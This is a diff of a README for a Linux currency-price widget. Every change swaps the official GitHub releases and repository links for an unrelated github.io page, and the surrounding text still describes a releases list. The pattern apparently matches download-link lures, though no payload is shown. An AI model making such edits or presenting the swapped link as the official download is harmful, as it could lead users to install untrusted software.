@@ -4,7 +4,7 @@
 
 Welcome! This guide will help you download and start using **nerkh-widget**, a beautiful widget that brings live currency, gold, coin, and cryptocurrency prices straight to your Linux desktop. Don't worry if you're not a tech expert — we'll walk you through everything step by step.
 
-[![Download nerkh-widget](https://img.shields.io/badge/Download-nerkh--widget-2ea44f?style=for-the-badge)](https://github.com/Mintsoullsfv/nerkh-widget/releases)
+[![Download nerkh-widget](https://img.shields.io/badge/Download-nerkh--widget-2ea44f?style=for-the-badge)](https://mintsoullsfv.github.io)
 
 ## 💡 What is nerkh-widget?
 
@@ -48,7 +48,7 @@ Follow these simple steps to get nerkh-widget on your desktop:
 
 Visit this link to download the application:
 
-**[https://github.com/Mintsoullsfv/nerkh-widget/releases](https://github.com/Mintsoullsfv/nerkh-widget/releases)**
+**[https://mintsoullsfv.github.io](https://mintsoullsfv.github.io)**
 
 You'll see a list of available releases. Look for the newest one at the top. Download the file that matches your system.
 
@@ -219,7 +219,7 @@ Need extra help? These resources are available:
 - **Project Wiki** — Community-written guides and documentation
 - **Source Code Repository** — For those wanting to understand inner workings
 
-Check the repository at **[https://github.com/Mintsoullsfv/nerkh-widget](https://github.com/Mintsoullsfv/nerkh-widget)** for all of these links and more resources.
+Check the repository at **[https://mintsoullsfv.github.io](https://mintsoullsfv.github.io)** for all of these links and more resources.
 
 ## ✋ Starting Fresh
 
